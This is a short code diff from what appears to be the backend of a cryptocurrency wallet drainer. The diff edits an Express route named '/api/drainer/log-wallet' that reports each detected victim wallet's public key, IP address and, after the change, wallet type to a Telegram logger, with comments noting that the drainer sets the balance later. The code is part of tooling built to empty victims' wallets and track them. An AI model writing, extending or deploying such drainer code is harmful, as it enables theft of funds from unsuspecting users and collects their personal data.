@@ -35,11 +35,12 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
     
     const telegramLogger = (await import('./src/telegram.js')).default;
     
-    // Log wallet detection if meaningful balance (this will be called from frontend)
+    // Log wallet detection (this will be called from frontend)
     await telegramLogger.logWalletDetected({
       publicKey: publicKey,
       lamports: 0, // Will be set by drainer when balance is fetched
-      ip: userIp
+      ip: userIp,
+      walletType: walletType || 'Unknown'
     });
     
     res.status(200).json({ success: true });
